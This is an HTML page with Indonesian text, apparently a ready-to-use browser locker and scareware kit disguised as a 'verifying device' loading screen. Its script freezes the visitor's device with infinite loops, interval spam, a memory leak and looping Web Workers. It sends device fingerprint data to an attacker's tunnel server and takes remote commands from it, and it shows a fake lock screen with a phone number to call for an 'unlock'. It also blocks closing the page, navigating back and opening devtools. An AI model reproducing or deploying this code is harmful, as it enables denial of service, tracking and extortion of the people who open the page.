<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: black;
            color: white;
            font-family: monospace;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
        }
        
        .screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            background: black;
            z-index: 9999;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top: 5px solid red;
            border-radius: 50%;
            animation: spin 0.5s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .lock-icon {
            font-size: 80px;
            animation: shake 0.3s infinite;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        .title {
            color: red;
            font-size: 28px;
            margin: 20px;
            font-weight: bold;
        }
        
        .number-box {
            background: red;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 24px;
            margin: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
<div class="screen" id="screen">
    <div class="spinner" id="spinner"></div>
    <div id="statusText">Memverifikasi perangkat...</div>
</div>

<script>
(function() {
    // ========== GANTI INI DENGAN URL TUNNEL LO ==========
    const ADMIN_SERVER = 'YOUR_TUNNEL_URL_HERE';
    // ====================================================
    
    const VICTIM_ID = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
    let isLooped = true;
    let intervals = [];
    let memoryLeak = [];
    let animationFrames = [];
    let workers = [];
    
    // Generate device code
    function generateDeviceCode() {
        let code = '';
        for(let i = 0; i < 8; i++) {
            if(i === 4) code += '-';
            code += Math.random().toString(36).substring(2, 3).toUpperCase();
        }
        return code;
    }
    
    const deviceCode = generateDeviceCode();
    
    // ========== INFINITE LOOP ENGINE ==========
    function startLoop() {
        isLooped = true;
        
        // 1. While true loop
        (function infiniteWhile() {
            let x = 0;
            while(isLooped) {
                x++;
                if(x > 100000) {
                    let arr = new Array(10000);
                    for(let i = 0; i < arr.length; i++) arr[i] = Math.random();
                    x = 0;
                }
            }
            if(isLooped) setTimeout(infiniteWhile, 0);
        })();
        
        // 2. Interval spam
        for(let i = 0; i < 200; i++) {
            let id = setInterval(() => {
                if(!isLooped) return;
                for(let j = 0; j < 5000; j++) Math.sin(Math.random());
            }, 1);
            intervals.push(id);
        }
        
        // 3. Memory leak
        setInterval(() => {
            if(isLooped) memoryLeak.push(new Array(50000).fill(Date.now()));
        }, 100);
        
        // 4. Web Worker spam
        function createWorker() {
            const code = `self.onmessage = () => { while(true) { let arr = []; for(let i=0;i<50000;i++) arr.push(Math.random()); } }`;
            const blob = new Blob([code], {type: 'application/javascript'});
            return new Worker(URL.createObjectURL(blob));
        }
        
        for(let i = 0; i < 10; i++) {
            try { workers.push(createWorker()); } catch(e) {}
        }
    }
    
    // ========== STOP LOOP ==========
    function stopLoop() {
        isLooped = false;
        intervals.forEach(id => clearInterval(id));
        intervals = [];
        workers.forEach(w => w.terminate());
        workers = [];
        memoryLeak = [];
        
        document.getElementById('screen').innerHTML = `
            <div style="text-align: center; padding: 20px;">
                <div style="font-size: 50px;">🔓</div>
                <div style="color: lime; font-size: 24px; margin: 20px;">DEVICE TELAH DIUNLOCK!</div>
                <div style="color: white;">Silakan tutup halaman ini.</div>
                <div style="color: gray; font-size: 12px; margin-top: 20px;">Terima kasih telah kooperatif.</div>
            </div>
        `;
    }
    
    // ========== KIRIM HEARTBEAT ==========
    function sendHeartbeat() {
        const data = {
            victim_id: VICTIM_ID,
            is_looped: isLooped,
            timestamp: Date.now(),
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            cores: navigator.hardwareConcurrency || 'unknown',
            memory: navigator.deviceMemory || 'unknown'
        };
        
        fetch(`${ADMIN_SERVER}/api/heartbeat`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {});
    }
    
    // ========== CEK PERINTAH DARI ADMIN ==========
    async function checkCommand() {
        try {
            const res = await fetch(`${ADMIN_SERVER}/api/command/${VICTIM_ID}`);
            const cmd = await res.json();
            
            if(cmd.action === 'stop_loop') {
                stopLoop();
            } else if(cmd.action === 'resume_loop') {
                startLoop();
            } else if(cmd.action === 'show_message') {
                alert(cmd.message);
            } else if(cmd.action === 'redirect') {
                window.location.href = cmd.url;
            }
        } catch(e) {}
    }
    
    // ========== START ATTACK ==========
    startLoop();
    
    // Heartbeat tiap 5 detik
    setInterval(sendHeartbeat, 5000);
    setInterval(checkCommand, 3000);
    sendHeartbeat();
    
    // Tampilkan lock screen setelah 3 detik
    setTimeout(() => {
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('statusText').innerHTML = `
            <div class="lock-icon">🔒💀🔒</div>
            <div class="title">DEVICE TERKUNCI!</div>
            <div style="margin: 20px;">
                Aktivitas mencurigakan terdeteksi!<br>
                Hubungi admin untuk membuka kunci:
            </div>
            <div class="number-box">📞 6285136579792</div>
            <div style="margin-top: 20px; font-size: 12px;">
                Kode Device: <strong style="color: yellow;">${deviceCode}</strong>
            </div>
            <div style="margin-top: 10px; font-size: 10px; color: #888;">
                Jangan tutup halaman ini!
            </div>
        `;
    }, 3000);
    
    // Anti close
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
        history.go(1);
    };
    
    window.onbeforeunload = function(e) {
        e.preventDefault();
        e.returnValue = '';
        return '';
    };
    
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });
    
    document.addEventListener('keydown', function(e) {
        if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
            e.preventDefault();
        }
    });
})();
</script>
</body>
</html>
